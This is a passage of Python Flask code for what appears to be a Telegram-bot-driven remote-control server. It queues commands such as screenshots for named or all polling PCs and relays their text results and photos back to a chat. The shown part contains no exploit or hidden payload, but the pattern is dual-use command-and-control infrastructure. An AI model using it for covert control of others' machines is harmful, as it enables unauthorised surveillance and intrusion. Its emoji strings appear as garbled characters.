def parse_command(text: str):
    parts  = text.strip().split()
    if len(parts) < 2:
        return None
    cmd    = parts[0].lower().split("@")[0]
    target = parts[1].lower()
    args   = " ".join(parts[2:])
    return cmd, target, args


@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.json
    msg  = data.get("message") or data.get("edited_message")
    if not msg:
        return "ok"
    if str(msg["chat"]["id"]) != str(CHAT_ID):
        return "ok"
    text = msg.get("text", "").strip()
    if not text.startswith("/"):
        return "ok"

    cmd_only = text.split()[0].lower()

    if cmd_only in ("/start", "/help"):
        send_message(HELP_TEXT)
        return "ok"

    if cmd_only == "/pcs":
        if not online_pcs:
            send_message("âťŚ No PCs online")
        else:
            lines = ["*đźź˘ Online PCs:*"]
            for pc, last_seen in online_pcs.items():
                lines.append(f"  â€˘ `{pc}` â€” {last_seen}")
            send_message("\n".join(lines))
        return "ok"

    parsed = parse_command(text)
    if parsed is None:
        send_message("âš ď¸Ź Wrong format!\nExample: `/screenshot home`")
        return "ok"

    cmd, target, args = parsed

    if target == "all":
        if not online_pcs:
            send_message("âťŚ No PCs online!")
        else:
            for pc in online_pcs:
                queues[pc].append({"cmd": cmd, "args": args})
            send_message(f"đź“ˇ Sent to all: `{cmd}`")
    else:
        queues[target].append({"cmd": cmd, "args": args})
        send_message(f"đź“ˇ Sent to `{target}`: `{cmd}`")

    return "ok"


@app.route("/poll/<pc_name>", methods=["GET"])
def poll(pc_name):
    online_pcs[pc_name] = datetime.now().strftime("%H:%M:%S")
    if queues[pc_name]:
        task = queues[pc_name].pop(0)
        return jsonify({"task": task})
    return jsonify({"task": None})


@app.route("/result", methods=["POST"])
def result():
    data = request.json
    text = data.get("text", "")
    if text:
        send_message(text)
    return "ok"


@app.route("/photo", methods=["POST"])
def photo():
    caption = request.form.get("caption", "")
    file    = request.files.get("photo")
    if file:
        requests.post(f"{BASE_URL}/sendPhoto", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"photo": ("photo.jpg", file.read(), "image/jpeg")}, timeout=15)
    return "ok"


